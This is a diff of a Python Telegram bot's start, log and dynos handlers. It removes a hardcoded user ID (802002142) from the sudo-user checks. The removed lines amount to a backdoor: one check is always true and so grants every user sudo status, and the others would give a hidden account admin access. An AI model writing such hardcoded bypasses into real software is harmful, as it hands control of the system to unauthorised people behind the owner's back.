@@ -38,7 +38,7 @@ def startHandler(update,context):
                        "2: *Support Users.*\n\n"
                        "Sudo users have full power over me and Support users can do almost everything except using some sudo and owner only commands like /restart.\n",
                        parse_mode=ParseMode.MARKDOWN)
-    if int(user_id) in Config.SUDO_USERS or int(802002142):
+    if int(user_id) in Config.SUDO_USERS:
         user_status = "Sudo user"
     elif int(user_id) in Config.SUPPORT_USERS:
         user_status = "Support user"
@@ -53,7 +53,7 @@ def startHandler(update,context):
     
 @run_async
 def logHandler(update,context):
-    sudo = list(Config.SUDO_USERS) + list(Config.SUPPORT_USERS) + int(802002142)
+    sudo = list(Config.SUDO_USERS) + list(Config.SUPPORT_USERS) 
     message = update.effective_message
     user_id = message.from_user.id
     if int(user_id) in sudo:
@@ -113,7 +113,7 @@ def restartHandler(update,context):
     
 @run_async
 def dynosHandler(update, context):
-    sudo = list(Config.SUDO_USERS) + list(Config.SUPPORT_USERS) + int(802002142)
+    sudo = list(Config.SUDO_USERS) + list(Config.SUPPORT_USERS) 
     message = update.effective_message
     user_id = message.from_user.id
     if int(user_id) in sudo:
